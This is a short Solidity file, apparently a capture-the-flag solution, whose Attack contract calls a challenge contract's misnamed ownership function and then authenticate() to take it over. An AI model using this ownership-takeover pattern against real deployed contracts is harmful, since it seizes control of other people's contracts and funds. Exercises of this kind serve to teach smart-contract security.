// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

contract Attack{
    constructor(IAssumeOwnershipChallange target){
        target.AssumeOwmershipChallenge();
        target.authenticate();
    }
}